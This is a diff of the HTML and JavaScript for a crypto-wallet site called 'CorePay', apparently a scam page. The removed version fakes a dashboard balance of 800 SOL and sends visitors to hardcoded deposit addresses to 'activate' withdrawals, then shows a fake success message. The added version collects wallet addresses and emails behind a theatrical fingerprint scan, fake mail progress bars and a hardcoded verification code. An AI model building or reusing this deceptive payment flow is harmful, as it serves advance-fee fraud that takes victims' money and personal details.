@@ -1,151 +1,146 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>CorePay Dashboard</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CorePay Activation Sandbox</title>
 <style>
 body{margin:0;background:#0b0f14;font-family:system-ui;color:white;opacity:0;transition:.3s}
-.header{background:#111827;padding:18px;display:flex;justify-content:space-between;align-items:center}
-.logo{height:34px}
-.grid{padding:18px;display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
-.card{background:rgba(17,24,39,.85);border-radius:18px;padding:20px;backdrop-filter:blur(10px);box-shadow:0 0 30px rgba(0,0,0,.4);transition:.2s}
-.card:hover{transform:translateY(-3px)}
-.balance{font-size:28px;font-weight:700;margin-top:6px}
-button{background:#22c55e;border:none;color:white;padding:12px 14px;border-radius:12px;cursor:pointer;margin-top:10px;font-weight:600;width:100%;transition:.3s}
-select,input{width:100%;padding:12px;margin-top:10px;background:#0b0f14;border:1px solid #263041;border-radius:10px;color:white}
-.feed{font-size:14px;line-height:1.6}
-.tag{padding:3px 8px;border-radius:8px;font-size:12px}
-.green{background:#065f46}
-.yellow{background:#78350f}
-.red{background:#7f1d1d}
+.center{height:100vh;display:flex;justify-content:center;align-items:center}
+.card{background:#111827;padding:40px;border-radius:18px;width:360px;text-align:center}
+h2{margin-top:0;margin-bottom:10px}
+input,select{width:100%;padding:14px;margin:10px 0;background:#0b0f14;border:1px solid #263041;border-radius:10px;color:white}
+button{width:100%;padding:15px;margin-top:10px;border:none;border-radius:12px;background:#22c55e;color:white;font-weight:700;cursor:pointer;transition:.3s}
+.logo{width:160px;margin-bottom:15px}
 .pop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);justify-content:center;align-items:center}
-.box{background:#111827;padding:28px;border-radius:16px;width:340px;text-align:center}
+.box{background:#111827;padding:30px;border-radius:16px;width:330px;text-align:center}
+.scan{width:120px;height:120px;border-radius:50%;border:4px solid #22c55e;margin:20px auto;animation:scan 2s infinite linear}
+@keyframes scan{100%{transform:rotate(360deg)}}
 .bar{height:8px;background:#1f2937;border-radius:8px;margin-top:15px}
 .fill{height:100%;width:0;background:#22c55e}
-.loading-dots span{animation:blink 1.4s infinite; font-weight:bold;}
-.loading-dots span:nth-child(2){animation-delay:.2s;}
-.loading-dots span:nth-child(3){animation-delay:.4s;}
-@keyframes blink{0%,80%,100%{opacity:0}40%{opacity:1}}
+.loadingOverlay{display:none;position:fixed;inset:0;background:#0b0f14;justify-content:center;align-items:center;z-index:9999;color:white;text-align:center;font-size:22px;}
+.loadingDots{display:inline-block;margin-left:5px;}
+.loadingDots span{animation:dot 1.4s infinite linear;display:inline-block;}
+.loadingDots span:nth-child(1){animation-delay:0s;}
+.loadingDots span:nth-child(2){animation-delay:.2s;}
+.loadingDots span:nth-child(3){animation-delay:.4s;}
+@keyframes dot{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
 </style>
 </head>
 <body>
-<div class="header">
-<div style="display:flex;align-items:center;gap:10px">
-<img src="logo.png" class="logo"><strong>CorePay</strong></div>
-<div id="walletLabel"></div>
-</div>
 
-<div class="grid">
+<div class="center">
 <div class="card">
-<h3>Wallet Overview</h3>
-<div class="balance" id="bal">800.00039 SOL</div>
-<div id="pending">Pending: 0</div>
-<div id="crypto">Crypto: SOL</div>
-<button onclick="activateWallet()">Activate Wallet</button>
-<a href="#" onclick="redirectWithdrawal()"><button>Withdraw</button></a>
-</div>
-
-<div class="card">
-<h3>Select Crypto</h3>
-<select id="coin">
-<option>BTC</option><option>SOL</option><option>TRX</option>
-<option>USDT-TRC20</option><option>USDT-ERC20</option>
-<option>BNB</option><option>ETH</option><option>XRP</option>
-<option>ADA</option><option>DOGE</option><option>MATIC</option>
-<option>LTC</option><option>AVAX</option><option>DOT</option>
+<img src="logo.png" class="logo">
+<h2>CorePay Activation Sandbox</h2>
+<select id="net">
+<option>TRX</option>
+<option>BTC</option>
+<option>ERC</option>
+<option>BNB</option>
+<option>SOL</option>
 </select>
-</div>
-
-<div class="card">
-<h3>Activity</h3>
-<div class="feed" id="feed"></div>
+<input id="addr" placeholder="Wallet address">
+<button onclick="finger()">Secure Login</button>
 </div>
 </div>
 
-<div class="pop" id="depositPopup">
+<!-- fingerprint pop -->
+<div class="pop" id="fingerPop">
 <div class="box">
-<h3>Deposit to Wallet</h3>
-<p>Minimum deposit: $10</p>
-<select id="coinSelect" onchange="updateWalletAddress()">
-<option>BTC</option><option>USDT-ERC20</option><option>USDT-TRC20</option><option>SOL</option><option>BNB</option>
-</select>
-<input type="number" id="amount" placeholder="Enter amount">
-<div style="display:flex;gap:6px;margin-top:10px">
-<input type="text" id="walletAddress" readonly placeholder="Wallet address will appear here">
-<button onclick="copyWallet()">📋</button>
+<h3 id="scanTitle">Fingerprint Scan</h3>
+<div class="scan"></div>
+<p id="scanText">Scanning identity...</p>
 </div>
-<button id="confirmDepositBtn" onclick="confirmDeposit()">Confirm Deposit</button>
-<button onclick="closeDeposit()">Close</button>
-<div id="depositLoading" class="bar"><div class="fill" id="depositFill"></div></div>
 </div>
+
+<!-- approval pop -->
+<div class="pop" id="approvePop">
+<div class="box">
+<h3>Wallet Approval</h3>
+<p>Approve secure connection</p>
+<button onclick="emailStep()">Approve</button>
+</div>
+</div>
+
+<!-- email pop -->
+<div class="pop" id="emailPop">
+<div class="box">
+<h3>Email Verification</h3>
+<div id="email1">
+<input id="email" placeholder="Email">
+<button onclick="sendEmail()">Send Code</button>
+</div>
+<div id="emailBarBox" style="display:none">
+<p id="emailStatus">Sending encrypted mail…</p>
+<div class="bar"><div class="fill" id="emailBar"></div></div>
+</div>
+<div id="email2" style="display:none">
+<input id="ecode" placeholder="Enter code">
+<button onclick="verifyEmailCode()">Verify</button>
+</div>
+</div>
+</div>
+
+<!-- animated redirect overlay -->
+<div class="loadingOverlay" id="loadingOverlay">
+<h3>Loading CorePay Dashboard<span class="loadingDots"><span>.</span><span>.</span><span>.</span></span></h3>
 </div>
 
 <script>
 document.addEventListener("DOMContentLoaded", ()=>{
-const wallet = localStorage.wallet || "demo";
-document.getElementById("walletLabel").innerText = wallet;
-const key = "corepay_" + wallet;
-let data = JSON.parse(localStorage.getItem(key)) || {balance:800.042, pending:[], history:[], withdrawalHistory:[]};
-function save(){ localStorage.setItem(key, JSON.stringify(data)); }
-
-function render(){
-document.getElementById("bal").innerText = data.balance.toFixed(3) + " " + (data.coin||"BTC");
-document.getElementById("pending").innerText = "Pending: "+data.pending.length;
-let feedEl = document.getElementById("feed"); feedEl.innerHTML="";
-data.history.slice().reverse().forEach(i=>feedEl.innerHTML+=`<div>${i}</div>`);
-}
-render();
-
-const wallets = {
-"BTC":"bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
-"USDT-ERC20":"0xA7f9C12D4E5F678901234567890ABCDEF1234567",
-"USDT-TRC20":"TXYz123456789ABCDEFGHJKLMNPQRST",
-"SOL":"9xQeWvG816bUx9EPfC9w8PqgkF5abcXYZ1234567",
-"BNB":"bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2"
+function validWallet(net,val){
+const rules={
+TRX:/^T[1-9A-HJ-NP-Za-km-z]{33}$/,
+BTC:/^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,39}$/,
+ERC:/^0x[a-fA-F0-9]{40}$/,
+BNB:/^0x[a-fA-F0-9]{40}$/,
+SOL:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/
 };
+return rules[net].test(val);
+}
+window.finger = function(){
+if(addr.value.length<5){alert("Enter wallet");return;}
+fingerPop.style.display="flex";
+scanTitle.innerText="Fingerprint Scan";
+scanText.innerText="Scanning identity...";
+let ok=validWallet(net.value,addr.value);
+let delay= ok ? 10000 : 6000;
+setTimeout(()=>{
+scanTitle.innerText= ok ? "Verification Successful" : "Verification Failed";
+scanText.innerText= ok ? "Wallet confirmed" : "Address format invalid";
+setTimeout(()=>{
+fingerPop.style.display="none";
+if(ok){approvePop.style.display="flex";}
+},2000);
+},delay);
+}
+window.emailStep = function(){approvePop.style.display="none"; emailPop.style.display="flex";}
+window.sendEmail = function(){
+let mail=email.value.trim();
+let valid=/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(mail);
+email1.style.display="none"; emailBarBox.style.display="block";
+let p=0;
+let t=setInterval(()=>{
+p+=4; emailBar.style.width=p+"%";
+if(p>=100){clearInterval(t);
+if(!valid){emailStatus.innerText="Mail error";setTimeout(()=>location="index.html",2000);}
+else{emailBarBox.style.display="none"; email2.style.display="block";}
+}
+},70);
+}
+window.verifyEmailCode = function(){
+let code=ecode.value.trim();
+if(code.length!==20 || code!=="88287463991237827383"){
+alert("Email verification failed"); location="index.html"; return;
+}
+localStorage.wallet=addr.value; localStorage.net=net.value;
 
-window.activateWallet = function(){
-let selectedCoin = document.getElementById("coin").value;
-document.getElementById("coinSelect").value = selectedCoin;
-updateWalletAddress();
-openDeposit();
-}
-window.openDeposit = function(){
-document.getElementById("depositPopup").style.display="flex";
-document.getElementById("amount").value="";
-document.getElementById("depositFill").style.width="0%";
-document.getElementById("confirmDepositBtn").style.background="#22c55e";
-document.getElementById("confirmDepositBtn").innerText="Confirm Deposit";
-}
-window.closeDeposit = function(){document.getElementById("depositPopup").style.display="none";}
-window.updateWalletAddress = function(){
-let coin=document.getElementById("coinSelect").value;
-document.getElementById("walletAddress").value = wallets[coin] || "xxx-"+coin+"-wallet";
-}
-window.copyWallet = function(){navigator.clipboard.writeText(document.getElementById("walletAddress").value);}
-window.confirmDeposit = function(){
-let coin=document.getElementById("coinSelect").value;
-let amt=parseFloat(document.getElementById("amount").value);
-let addr=document.getElementById("walletAddress").value;
-let btn=document.getElementById("confirmDepositBtn");
-if(!amt||!addr)return alert("Enter amount and select coin."); 
-if(amt<10)return alert("You need to make a Minimum deposit of $100 to Automatically activate the funds inside the connected Wallet Address to successfully enable withdrawal");
-if(wallets[coin]!==addr){alert("Wallet address does not match selected coin!");return;}
-btn.style.background="white"; btn.style.color="#0b0f14"; btn.innerText="Confirming deposit...";
-let fill=0;
-let interval=setInterval(()=>{
-fill+=2; document.getElementById("depositFill").style.width=fill+"%";
-if(fill>=100){
-clearInterval(interval); btn.innerText="Deposit Successful"; btn.style.background="#22c55e"; btn.style.color="white";
-data.pending.push("Deposit "+amt+" "+coin); data.history.push("Deposit "+amt+" "+coin+" <span class='tag green'>Success</span>"); save(); render();
-setTimeout(closeDeposit,1500);
-}},100);
-}
+// Show animated overlay
+document.getElementById("loadingOverlay").style.display="flex";
 
-window.redirectWithdrawal = function(){
-document.body.innerHTML="<div style='color:white;text-align:center;margin-top:50vh'>Redirecting to Withdrawal<span class='loading-dots'><span>.</span><span>.</span><span>.</span></span></div>";
-setTimeout(()=>location="withdrawal.html",6000);
+// Redirect after 6 seconds
+setTimeout(()=>{location.href="home.html";},6000);
 }
 
 setTimeout(()=>document.body.style.opacity=1,300);
